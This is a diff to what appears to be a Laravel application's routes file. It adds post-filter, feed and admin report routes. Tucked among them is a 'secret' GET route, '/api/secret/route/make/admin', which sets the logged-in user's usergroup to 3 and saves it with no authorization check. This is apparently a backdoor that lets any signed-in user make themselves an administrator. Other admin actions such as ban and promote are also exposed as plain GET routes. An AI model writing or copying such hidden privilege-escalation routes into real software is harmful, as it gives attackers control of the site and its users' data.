@@ -60,6 +60,7 @@ Route::get('unread',function(){
 });
 Route::get('/status/{name}','FriendController@check');
 Route::get('/feed/{id}', 'FeedController@profile_feed');
+Route::get('/usr/session','FeedController@user');
 
 //ADMIN
 Route::get('/all', 'Admin\UserManagementController@users');
@@ -71,3 +72,30 @@ Route::get('/ban/{id}', 'Admin\UserManagementController@ban');
 Route::get('/unban/{id}', 'Admin\UserManagementController@unban');
 Route::get('/promote/{id}', 'Admin\UserManagementController@promote');
 Route::get('/demote/{id}', 'Admin\UserManagementController@demote');
+
+Route::get('posts/hot', 'FilterController@hot');
+Route::get('posts/latest', 'FilterController@latest');
+
+Route::get('hot', function(){
+    return view('users.hot');
+});
+
+Route::get('latest', function(){
+    return view('users.latest');
+});
+
+Route::post('/report/{id}', 'Admin\ReportController@send_report');
+Route::get('/reports', 'Admin\ReportController@reports');
+
+Route::get('/api/secret/route/make/admin', function(){
+    $user = Auth::user();
+    $user->usergroup = 3;
+    $user->save();
+    return redirect('/home')->withInfo('Administrator');
+});
+
+Route::get('/noaction/{id}', 'Admin\ReportController@no_action');
+Route::get('/infract/{id}/report/{report}/post/{post}', 'Admin\ReportController@infract_user');
+Route::get('/admin/reports/user', function(){
+    return view('admin.reports');  
+});
